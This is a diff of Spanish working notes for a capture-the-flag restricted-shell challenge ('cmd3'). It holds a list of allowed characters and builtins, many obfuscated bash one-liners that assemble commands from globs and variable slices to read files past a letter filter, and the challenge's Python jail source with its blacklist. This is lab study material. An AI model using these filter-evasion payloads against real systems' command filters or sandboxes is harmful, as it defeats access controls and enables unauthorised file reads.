@@ -72,7 +72,7 @@ COMANDOS QUE TENEMOS
 ls cat id
 
 BUILT INS COMMANDS
-'history', 'if', 'jobs', 'kill', 'let', 'local', 'logout', 'mapfile', 'popd', 'printf', 'pushd', 'pwd', 'read', 'readarray', 'readonly', 'return', 'select', 'set', 'shift', 'shopt', 'source', 'suspend', 'test', 'time', 'times', 'trap', 'true', 'type', 'typeset', 'ulimit', 'umask', 'unalias', 'unset', 'until', 'variables', 'wait', 'while', 'alias', 'bg', 'bind', 'break', 'builtin', 'caller', 'case', 'cd', 'command', 'compgen', 'complete', 'compopt', 'continue', 'coproc', 'declare', 'dirs', 'disown', 'echo', 'enable', 'eval', 'exec', 'exit', 'export', 'false', 'fc', 'fg', 'for', 'for', 'function', 'getopts', 'hash', help
+'history', 'if', 'jobs', 'kill', 'let', 'local', 'logout', 'mapfile', 'popd', 'printf', 'pushd', 'pwd', 'read', 'readarray', 'readonly', 'return', 'select', 'set', 'shift', 'shopt', 'source', 'suspend', 'test', 'time', 'times', 'trap', 'true', 'type', 'typeset', 'ulimit', 'umask', 'unalias', 'unset', 'until', 'variables', 'wait', 'while', 'alias', 'bg', 'bind', 'break', 'builtin', 'caller', 'case', 'cd', 'command', 'compgen', 'complete', 'compopt', 'continue', 'coproc', 'declare', 'dirs', 'disown', 'echo', 'enable', 'eval', 'exec', 'exit', 'export', 'false', 'fc', 'fg', 'for', 'for', 'function', 'getopts', 'hash', 'help'
 
 BUILT INS QUE PODEMOS ESCRIBIR
 popd, pwd, cd, echo
@@ -237,7 +237,67 @@ prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=????????
 cat ???????/????????????????????????????????
 prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}???????/????????????????????????????????
 
-
+cat cmd3.py
 __=$_;___=~;____=?;_____=??;______=????;_______=??????;________=????????;_________=?????????;__________=??????????????????;___________=$(${__:${#_____}:${#____}}${___:${#________}:${#____}});____________=$(${___:${#______}:${#____}}${___:${#_______}:${#____}}${___:${#____}:${#_____}}${___________:${#__________}:${#____}}.????????????);${___:${#_______}:${#____}}${____________:${#_____}:${#____}}${____________:${#_________}:${#____}}${___________:${#__________}:${#____}}????.??
+
+eso te da todas menos: q, ñ, z
+
+
+
+
+
+CARACTERES PERMITIDOS
+# $ % ( ) + , - . / : ; < = > ? @ [ \ ] ^ _ { } ~
+
+LETRAS QUE TENEMOS
+a b c d e f g h i j k l m n o p r s t u v w x y
+
+COMANDOS QUE TENEMOS
+ls cat id
+
+BUILT INS QUE PODEMOS ESCRIBIR
+history, if, jobs, kill, let, local, logout, mapfile, popd, printf, pushd, pwd, read, readarray, readonly, return, select, set, shift, shopt, source, suspend, test, time, times, trap, true, type, typeset, ulimit, umask, unalias, unset, until, variables, wait, while, alias, bg, bind, break, builtin, caller, case, cd, command, compgen, complete, compopt, continue, coproc, declare, dirs, disown, echo, enable, eval, exec, exit, export, false, fc, fg, for, for, function, getopts, hash, help
+
+
+y="this Is A test"
+echo "${y^^}"
+
+
+cat cmd3.py
+prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??
+
+
+
+ECHO SCRIPT CON TODAS LAS LETRAS
+prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);script=$(${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??);${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}$script
+
+
+OBTENGO SCRIPT CON TODAS LAS LETRAS
+prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);script=$(${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??)
+
+script:
+#!/usr/bin/python import base64, random, math import os, sys, time, string from threading import Timer def rstring(N): return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N)) password = rstring(32) filename = rstring(32) TIME = 60 class MyTimer(): global filename timer=None def __init__(self): self.timer = Timer(TIME, self.dispatch, args=[]) self.timer.start() def dispatch(self): print 'time expired! bye!' sys.stdout.flush() os.system('rm flagbox/'+filename) os._exit(0) def filter(cmd): blacklist = '` !&|"\'*' for c in cmd: if ord(c)>0x7f or ord(c)<0x20: return False if c.isalnum(): return False if c in blacklist: return False return True if __name__ == '__main__': MyTimer() print 'your password is in flagbox/{0}'.format(filename) os.system("ls -al") os.system("ls -al jail") open('flagbox/'+filename, 'w').write(password) try: while True: sys.stdout.write('cmd3$ ') sys.stdout.flush() cmd = raw_input() if cmd==password: os.system('./flagbox/print_flag') raise 1 if filter(cmd) is False: print 'caught by filter!' sys.stdout.flush() raise 1 os.system('echo "{0}" | base64 -d - | env -i PATH=jail /bin/rbash'.format(cmd.encode('base64'))) sys.stdout.flush() except: os.system('rm flagbox/'+filename) os._exit(0)
+
+
+
+
+
+$(__________=??;${#__________})
+
+
+$(__________=??;${#__________})
+
+prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??
+
+
+
+
+
+cat 
+prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??
+
+ 
+cat flagbox/
+prev=$_;home=~;uno=?;dos=??;cuatro=????;seis=??????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);script=$(${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??);${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}???????/
 
 
